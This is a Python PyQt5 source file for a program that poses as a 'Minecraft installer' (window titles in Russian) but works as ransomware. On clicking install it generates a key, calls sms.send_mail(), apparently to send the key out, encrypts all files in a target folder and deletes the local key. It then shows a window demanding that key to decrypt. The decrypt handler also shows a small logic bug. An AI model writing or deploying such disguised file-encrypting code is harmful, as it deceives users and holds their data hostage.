from crypt import write_key, load_key, encrypt, decrypt
import os
import sms
import sys
from ui1 import Ui_Form, Ui_installer
from PyQt5.QtWidgets import QMainWindow, QApplication
key = None


class TaskApp2(QMainWindow, Ui_Form):
    def __init__(self):
        super(TaskApp2, self).__init__()
        self.setupUi(self)
        self.setWindowTitle("Установщик Minecraft")
        self.push_2.clicked.connect(self.Push1)

    def Push1(self):
        global key
        directory = r"C:\Users\PC\Downloads\Telegram Desktop\test"
        files = os.listdir(directory)
        with open("crypto.key", "w") as fil:
            fil.write(self.lineEdit.text())
        with open("crypto.key") as fil:
            key1 = str(fil.read())
        if key1 == key:
            for i in files:
                filename = fr"{directory}\{i}"
                decrypt(filename, load_key())
            self.info_label.setText("Ключ верный")
            window1.close()
            self.info_label.setText("Неверный ключ")


class TaskApp1(QMainWindow, Ui_installer):
    def __init__(self):
        super(TaskApp1, self).__init__()
        self.setupUi(self)
        self.setWindowTitle("Установщик Minecraft")
        self.push.clicked.connect(self.Push)

    def Push(self):
        global key
        directory = r"C:\Users\PC\Downloads\Telegram Desktop\test"
        files = os.listdir(directory)
        write_key()
        with open("crypto.key") as fil:
            key = fil.readline()
        sms.send_mail()
        for i in files:
            filename = fr"{directory}\{i}"
            encrypt(filename, load_key())
        os.remove("crypto.key")
        window.close()
        window1.show()


if __name__ == "__main__":
    app = QApplication(sys.argv)

    window = TaskApp1()
    window1 = TaskApp2()

    window.show()
    sys.exit(app.exec_())
